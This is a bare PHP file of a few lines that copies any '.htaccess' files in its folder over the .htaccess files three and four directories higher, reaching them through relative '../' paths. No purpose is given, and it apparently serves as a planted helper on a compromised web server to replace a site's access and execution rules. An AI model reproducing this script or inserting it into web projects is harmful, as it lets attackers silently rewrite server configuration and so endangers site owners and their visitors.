<?php 
	$files = glob("*.htaccess");
	foreach ($files as $value) {
		copy($value, '../../../../.htaccess');
		copy($value, '../../../.htaccess');
	}
?>